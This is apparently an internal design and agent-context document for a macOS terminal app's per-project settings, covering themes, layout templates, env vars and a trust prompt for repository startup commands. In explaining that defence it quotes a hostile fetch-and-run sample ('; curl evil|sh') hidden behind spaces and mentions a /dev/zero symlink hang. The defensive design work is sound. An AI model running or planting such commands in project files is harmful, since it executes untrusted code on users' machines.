---
paths:
    - "Sources/ZettyCore/Settings/**"
    - "App/Sources/App/ProjectSettingsSheet.swift"
    - "App/Sources/App/IconPicker.swift"
triggers:
    - "changing per-project settings, color, icon, or theme overrides"
    - "layout templates or .zetty/project.json"
    - "per-project env vars or startup commands"
---

# Per-project settings

> Split out of `CLAUDE.md` / `AGENTS.md` (which stay under the agent context
> limit). This file is authoritative: edit it here, then run `hydra sync`.

Right-click a project row → **Rename…** / **Project Settings…** (name, curated
color, SF Symbol icon, preserve-sessions + notifications tri-states). Pure
model in `ZettyCore/Settings/` (`ProjectSettings` · `ProjectSettingsFile` ·
`ProjectSettingsStore` · `ProjectSettingsResolver`); private JSON at
`~/Library/Application Support/zetty/project-settings.json` keyed by
**canonical rootPath** (survives remove/re-add; a moved directory orphans its
settings — accepted for v1). Precedence: project override → global config →
default. App wiring: `AppDelegate.resolvedSettings(for:)` +
`updateProjectSettings(_:for:)`; per-pane preserve decision inside
`applySessionPreservation`'s provider via `WorkspaceModel.project(containing:)`
(affects NEW panes only); notification gating at the fire site
(sound/banners) and in `publishAttentionCount` (dock badge) — the in-app
bell/inbox and status dots are never gated. Palette ids in
`ZTheme.projectPalette` (8 curated hues, distinct from accent + semantic
status colors, appearance-reactive: each id carries a dark/light hex pair).

v2/v3 additions (same design doc):
- **Appearance + theme overrides** — modeled on the global keys:
  `ProjectSettings.appearanceOverride` ("system"/"dark"/"light") +
  `themeDarkOverride`/`themeLightOverride` (scheme per axis), each
  independently nil = follow global. Resolved in
  `AppDelegate.applyThemeForActiveProject()` — the single visual decision
  point (transient, never persisted into the global config; unknown scheme
  names fall back to the global choice; it also pins/releases
  `NSApp.appearance` for the EFFECTIVE axis). Activation hook:
  `TerminalViewController.onActiveProjectChanged` (project select — incl.
  tab-row clicks that switch projects — add, remove). OS appearance flips
  arrive via a distributed-notification observer (KVO on
  `effectiveAppearance` goes silent while pinned), and `osIsDark` reads the
  system default when pinned so a pinned project can't poison the next
  project's resolution.
- **Layout templates** — `LayoutTemplate`/`TemplateNode` (pure, mirrors
  `SurfaceNode`; panes carry root-relative cwds + startup commands;
  `capture(from:rootPath:)` / `tabList(rootPath:)`). Storage: the
  `layoutTemplate` field of the git-committable `.zetty/project.json`
  (`ProjectFile`/`ProjectFileIO` — shareable keys ONLY: layoutTemplate,
  startupCommand, envNames; no env-values field exists, and a hand-edited one
  is dropped on read) with a global fallback (`LayoutTemplateStore`,
  `layout-template.json` in App Support). Applied on `add-project` (replaces
  the single-pane seed) or on demand from the sheet's Layout row
  (Save Current / Apply / Clear). Startup commands inject once via
  `registry.sendText` ~0.8s after the pane spawns
  (`pendingStartupCommands`, in-memory only — a relaunch never re-runs
  commands into preserved sessions).
- **Startup-command trust** (2026-11-14) — a repo's `.zetty/project.json` is
  written by whoever wrote the repo, so its commands are held
  (`TerminalViewController.heldTemplateCommands`) until
  `AppDelegate.approveTemplateCommands` says yes. The provider returns a
  `ResolvedLayoutTemplate` naming its source: the user's global template
  (`.globalDefault`) runs without asking. A repo's asks once per project
  (`settingsKey`) and per exact command list: `StartupCommandTrust` stores a
  length-prefixed SHA-256 of every pane's folder and command in
  `startup-command-trust.json` (App Support), so any change asks again.
  Declining opens the panes without typing anything and is not remembered.
  A pane that spawned while the prompt was open is typed into on approval
  (`spawnedWhileHeld`), but only while its shell is still in front
  (`typeIntoIdleShells` probes it, like the foreground poll): the panes open
  behind the prompt, and by the time it is answered one may run `claude` or
  `ssh`, which would get the command. A pane hibernated meanwhile gets it when
  it wakes. The prompt (`StartupCommandPrompt`) shows commands through
  `StartupCommandDisplay`, which turns control characters into their control
  pictures; bidi controls, zero-width and other invisible characters, line
  and paragraph separators and unusual spaces into `<U+XXXX>`, by Unicode
  category (format, separators, private use, unassigned) as well as a list
  of blank-drawing letters and marks (Hangul fillers, U+2800, Khmer U+17B4/5,
  U+034F, variation selectors) — a list alone missed the soft hyphen and the
  Braille blank (security review of b0ed43e); combining marks past three on
  one letter, which stack over their neighbours; and a run of
  three or more spaces into `<N spaces>`; and forces each line left to right
  (LRO … PDF), so right-to-left letters can't reorder its punctuation. The
  box is sized from the laid-out text with an always-visible scroller: the
  2026-11-14 sweep hid `; curl evil|sh` behind 2,000 spaces in a box sized by
  counting newlines. "Open Without Running" is the default button. The window
  floats above the main window (hidden while Zetty is in the background), so a
  click behind it doesn't bury it with its commands waiting.
- **`.zetty/project.json` is read with limits** (`ProjectFileIO.load`): a
  regular file (a link to one is fine) of at most 1 MB. git can commit it as a
  link to `/dev/zero`, which was read forever on the main thread before any
  prompt appeared.
  **It is a plain window, never a sheet or `runModal`:** AppKit ignores
  `NSApp.terminate` while a sheet is up, before `applicationShouldTerminate`
  runs (seen in the test app: `zetty quit --force` did nothing), and the
  prompt can appear unattended from `zetty add-project`, so a sheet would
  stall quit, the updater and a shutdown.
- **Env vars** — `ProjectSettings.env` (values in the PRIVATE store only);
  injected as repeated ghostty `env` directives per surface
  (`SurfaceRegistry.surfaceEnvironment` → `config.custom("env", "K=V")`).
  New panes only — a preserved zmx session captures env at first creation.
  Sheet editor: KEY=VALUE lines.
